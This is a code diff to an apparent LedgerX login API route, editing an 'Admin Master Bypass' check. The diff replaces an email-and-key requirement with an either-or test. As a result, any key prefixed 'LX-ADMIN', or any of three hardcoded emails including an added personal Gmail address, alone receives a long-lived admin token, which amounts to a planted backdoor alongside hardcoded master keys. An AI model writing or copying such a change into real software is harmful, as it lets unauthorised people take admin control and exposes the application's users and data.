@@ -20,8 +20,8 @@ export async function POST(req: Request) {
     // 1. Admin Master Bypass
     const adminEmail = (process.env.ADMIN_EMAIL || "admin@ledgerx.com").toLowerCase().trim();
     if (
-      (cleanEmail === adminEmail || cleanEmail === "admin@demo.com") &&
-      (cleanKey === 'LX-ADMIN-MASTER-2027' || cleanKey.startsWith('LX-ADMIN') || cleanKey === 'LX-0001-XXXX-2026')
+      (cleanKey === 'LX-ADMIN-MASTER-2027' || cleanKey.startsWith('LX-ADMIN')) ||
+      (cleanEmail === adminEmail || cleanEmail === "admin@demo.com" || cleanEmail === "yasin.khan098@gmail.com")
     ) {
       const adminToken = "admin_" + crypto.randomBytes(32).toString("hex");
       const farFuture = new Date();
